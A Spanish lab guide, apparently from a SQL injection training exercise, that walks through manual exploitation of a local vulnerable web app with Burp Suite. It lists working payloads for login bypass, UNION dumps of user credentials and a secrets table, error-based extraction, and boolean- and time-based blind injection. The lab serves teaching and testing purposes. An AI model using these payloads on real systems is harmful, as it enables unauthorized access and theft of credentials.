# 02 — Explotación manual con Burp Suite

Objetivo: demostrar SQLi **manipulando peticiones HTTP a mano**, interceptando con
Burp Suite (Proxy / Repeater), antes de automatizar con SQLMap.

## Preparación
1. Configurar el navegador para usar el proxy de Burp (`127.0.0.1:8080` por defecto de
   Burp). **Ojo:** el WAF de este lab también usa 8080; para la parte manual apuntá el
   navegador a la app directa **http://localhost:3000** y, si hay choque de puertos,
   cambiá el *listener* de Burp a `127.0.0.1:8081`.
2. Interceptar (`Proxy > Intercept on`) y enviar las peticiones a **Repeater** (Ctrl+R).

---

## 2.1 — Bypass de autenticación (`POST /login`)
Petición normal capturada:
```
POST /login HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

username=admin&password=cualquiera
```
La consulta backend es:
`... WHERE username = '<u>' AND pass_plain = '<p>'`

### Payloads (en Repeater)
| Campo | Payload | Efecto |
|---|---|---|
| `username` | `admin' -- ` | Comenta la verificación de password → entra como **admin** |
| `username` | `' OR '1'='1' -- ` | Devuelve el primer usuario (admin) |
| `password` | `' OR '1'='1` (user=`admin`) | Condición siempre verdadera |

URL-encode del cuerpo (Burp lo hace con Ctrl+U sobre la selección):
```
username=admin%27%20--%20&password=x
```
Resultado: redirección a `/panel` con sesión de **admin** sin conocer la contraseña.

---

## 2.2 — Enumeración con UNION (`GET /?q=`)
La consulta es `... WHERE name LIKE '%<q>%' ...` con **6 columnas**
(`id,name,description,price,stock,category`).

### Paso 1 — número de columnas
`ORDER BY` incremental o `UNION SELECT` con NULLs:
```
GET /?q=zzz%27%20UNION%20SELECT%201,2,3,4,5,6-- -
```
Si la página renderiza una "fila" con esos valores → 6 columnas confirmadas.

### Paso 2 — extraer datos (volcado de credenciales)
```
GET /?q=zzz' UNION SELECT id, username, pass_plain, password_hash, role, email FROM users-- -
```
(URL-encoded)
```
/?q=zzz%27%20UNION%20SELECT%20id,username,pass_plain,password_hash,role,email%20FROM%20users--%20-
```
Las "tarjetas de producto" ahora muestran **usuarios y contraseñas**.

### Paso 3 — metadatos / otras tablas
```
/?q=zzz' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -
/?q=zzz' UNION SELECT label,secret_value,api_token,4,5,6 FROM secrets-- -
```
Este último vuelca la tabla `secrets` (incluye el `FLAG{...}`).

---

## 2.3 — Error-based (`GET /products/:id`)
Contexto numérico (sin comillas): `... WHERE id = <id>`.
```
/products/1 AND extractvalue(1, concat(0x7e, (SELECT version())))
```
URL:
```
/products/1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))
```
El mensaje de error de MySQL (expuesto por la app) revela la cadena tras `~`, p. ej.
`XPATH syntax error: '~8.0.x'`. Sustituyendo la subconsulta se extrae cualquier dato:
```
... (SELECT concat(username,0x3a,pass_plain) FROM users LIMIT 1) ...
```

---

## 2.4 — Boolean-based blind (`GET /products/:id`)
```
/products/1 AND 1=1      -> producto visible (verdadero)
/products/1 AND 1=2      -> "No encontrado" (falso)
/products/1 AND substring(version(),1,1)=8   -> verdadero si MySQL 8
```

---

## 2.5 — Time-based blind (`GET /api/products?minStock=`)
```
/api/products?minStock=0 OR SLEEP(5)     -> la respuesta tarda ~5s (verdadero)
/api/products?minStock=0 AND SLEEP(5)    -> compara tiempos por condición
```

---

## Qué registrar como evidencia
- Captura de Repeater con el payload y la respuesta (status + cuerpo).
- Antes/después: login normal (401) vs. login con bypass (302 → `/panel`).
- Volcado UNION mostrando credenciales en pantalla.
- Guardar en `evidencias/` (p. ej. `02-login-bypass.png`, `02-union-dump.png`).
